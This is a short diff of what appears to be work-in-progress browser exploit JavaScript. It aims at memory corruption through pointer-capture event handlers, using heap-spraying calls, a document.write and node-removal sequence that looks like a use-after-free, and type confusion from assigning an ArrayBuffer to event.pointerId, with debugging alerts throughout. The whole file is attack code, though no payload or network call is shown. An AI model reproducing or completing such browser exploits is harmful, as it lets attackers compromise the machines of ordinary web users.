@@ -91,7 +91,7 @@ pi = cache_frame.contentDocument.appendChild(
 setTimeout(() => {
   h1.textContent = 'click me';
   debugger;
-  sprayStringImpl(0,10000)
+  //sprayStringImpl(0,10000)
   document.addEventListener('lostpointercapture', () => {
     document.write('x');
     document.firstChild.remove();
@@ -133,21 +133,21 @@ setTimeout(() => {
         //g_arr_ab_1.push(b);
         
         //alert(tohex(event.pointerId))
-	  for (var i = 0; i < event.pointerId +1; i++ ) {
+	  /*for (var i = 0; i < event.pointerId +1; i++ ) {
             if(tohex(event.pointerId) == 0) {
                 alert(event.pointerId)
             }
-        }
+        }*/
 	  debugger;
-	  alert(bigint2float(0x4141414141))
-        event.pointerId = 0x4141414141
+	  //alert(bigint2float(0x4141414141))
+        event.pointerId = ab.buffer;
         alert(tohex(event.pointerId))
         //g_arr_ab_1;
         
 
     
   });
-}, 5); // enough time for the style sheet to be cached
+}, 0); // enough time for the style sheet to be cached
 
 }
         main();
